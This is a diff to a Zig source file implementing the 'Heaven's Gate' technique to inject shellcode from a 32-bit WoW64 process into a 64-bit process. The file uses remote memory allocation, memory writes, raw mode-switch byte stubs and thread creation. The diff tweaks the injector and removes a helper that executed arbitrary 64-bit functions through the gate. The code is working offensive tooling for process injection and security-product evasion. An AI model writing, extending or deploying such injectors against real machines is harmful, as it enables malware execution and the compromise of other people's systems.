@@ -20,8 +20,10 @@ pub const PDWORD = *DWORD;
 pub const PROCESS_ALL_ACCESS = 0x001FFFFF;
 pub const MEM_COMMIT = windows.MEM_COMMIT;
 pub const MEM_RESERVE = windows.MEM_RESERVE;
+pub const PAGE_READWRITE = windows.PAGE_READWRITE;
 pub const PAGE_EXECUTE_READWRITE = windows.PAGE_EXECUTE_READWRITE;
 pub const FALSE = windows.FALSE;
+pub const INFINITE = windows.INFINITE;
 
 const ProcessWow64Information = 26;
 const STATUS_SUCCESS: NTSTATUS = @enumFromInt(0);
@@ -41,7 +43,7 @@ pub const WOW64CONTEXT = extern struct {
         bPadding2: [8]BYTE,
     },
     t: extern union {
-        hThread: HANDLE,
+        hThread: ?HANDLE,
         bPadding2: [8]BYTE,
     },
 };
@@ -68,6 +70,7 @@ extern "kernel32" fn VirtualAllocEx(hProcess: HANDLE, lpAddress: ?LPVOID, dwSize
 extern "kernel32" fn WriteProcessMemory(hProcess: HANDLE, lpBaseAddress: LPVOID, lpBuffer: *const anyopaque, nSize: SIZE_T, lpNumberOfBytesWritten: ?*SIZE_T) callconv(WINAPI) BOOL;
 extern "kernel32" fn CloseHandle(hObject: HANDLE) callconv(WINAPI) BOOL;
 extern "kernel32" fn ResumeThread(hThread: HANDLE) callconv(WINAPI) DWORD;
+extern "kernel32" fn WaitForSingleObject(hHandle: windows.HANDLE, dwMilliseconds: u32) callconv(WINAPI) u32;
 
 // Heaven's Gate code stubs
 const bExecute64 linksection(".text") = [_]u8{
@@ -127,7 +130,12 @@ pub fn is_process_wow64(ProcessHandle: HANDLE) BOOL {
     return if (pIsWow64 != null) 1 else 0;
 }
 
-/// Execute Heaven's Gate technique to inject shellcode into a 64-bit process from WOW64
+// fn waitForEnter() void {
+//     var buffer: [256]u8 = undefined;
+//     _ = std.io.getStdIn().reader().readUntilDelimiterOrEof(buffer[0..], '\n') catch {};
+// }
+
+/// Execute Heaven's Gate technique to inject shellcode into a 64-bit process from WoW64
 pub fn injectShellcode(process_id: ULONG, shellcode_buf: ?PVOID, shellcode_len: ULONG) BOOL {
     var process_handle: ?HANDLE = null;
     var virtual_memory: ?LPVOID = null;
@@ -201,6 +209,8 @@ pub fn injectShellcode(process_id: ULONG, shellcode_buf: ?PVOID, shellcode_len: 
 
     print("[*] Written to memory at: 0x{X} [{d} bytes written]\n", .{ @intFromPtr(virtual_memory.?), written });
 
+    // waitForEnter();
+
     // Prepare 64-bit injection context
     wow64_ctx.h.hProcess = process_handle.?;
     wow64_ctx.s.lpStartAddress = virtual_memory;
@@ -233,7 +243,7 @@ pub fn injectShellcode(process_id: ULONG, shellcode_buf: ?PVOID, shellcode_len: 
     print("[*] Thread created: 0x{x}\n", .{@intFromPtr(wow64_ctx.t.hThread)});
 
     // Resume thread that has been created in a suspended state
-    if (ResumeThread(wow64_ctx.t.hThread) == 0) {
+    if (ResumeThread(wow64_ctx.t.hThread.?) == 0) {
         print("[-] ResumeThread Failed with Error: {d}\n", .{GetLastError()});
         if (process_handle) |handle| {
             _ = CloseHandle(handle);
@@ -249,69 +259,6 @@ pub fn injectShellcode(process_id: ULONG, shellcode_buf: ?PVOID, shellcode_len: 
     if (process_handle) |handle| {
         _ = CloseHandle(handle);
     }
-
-    return success;
-}
-
-pub fn injectFunction(func_addr: ?*anyopaque, argc: c_int, argv: [*]u64, ret_val: *u64) BOOL {
-    var fn_execute64: FN_EXECUTE64 = undefined;
-    var fn_function64: FN_FUNCTION64 = undefined;
-    var wow64_ctx: WOW64CONTEXT = std.mem.zeroes(WOW64CONTEXT);
-    var success: BOOL = 0;
-
-    // Validate parameters
-    if (func_addr == null) {
-        print("[-] Invalid function address provided\n", .{});
-        return 0;
-    }
-
-    // Cast .text code byte stubs to function pointers
-    fn_execute64 = @ptrCast(@alignCast(&bExecute64[0]));
-    fn_function64 = @ptrCast(@alignCast(&bFunction64[0]));
-
-    // Check if current process is Wow64
-    if (is_process_wow64(GetCurrentProcess()) == 0) {
-        print("[-] Current process is not a Wow64 process\n", .{});
-        return success;
-    } else {
-        print("[*] Current process is Wow64\n", .{});
-    }
-
-    print("[*] Preparing to execute function at: 0x{X}\n", .{@intFromPtr(func_addr.?)});
-    print("[*] Function arguments count: {d}\n", .{argc});
-
-    // Prepare 64-bit execution context
-    wow64_ctx.h.hProcess = GetCurrentProcess(); // Use current process instead of remote
-    wow64_ctx.s.lpStartAddress = func_addr; // Function address to execute
-    wow64_ctx.p.lpParameter = if (argc > 0) @ptrCast(argv) else null; // Parameters
-    // hThread is already zeroed from std.mem.zeroes
-
-    // Log arguments if any
-    if (argc > 0) {
-        print("[*] Function arguments:\n", .{});
-        var i: c_int = 0;
-        while (i < argc) : (i += 1) {
-            print("    argv[{d}]: 0x{X}\n", .{ i, argv[@intCast(i)] });
-        }
-    }
-
-    print("[*] About to execute Heaven's Gate transition...\n", .{});
-
-    // Switch the processor to 64-bit mode and execute the function
-    const result = fn_execute64(fn_function64, @ptrCast(&wow64_ctx));
-    print("[*] Heaven's Gate transition completed, result: {d}\n", .{result});
-
-    if (result == 0) {
-        print("[-] Failed to switch processor context and execute 64-bit function\n", .{});
-        return success;
-    }
-
-    // Store the return value
-    ret_val.* = result;
-    print("[*] Function execution completed, return value: 0x{X}\n", .{ret_val.*});
-
-    success = 1;
-    print("[+] Successfully executed function via Heaven's Gate\n", .{});
 
     return success;
 }
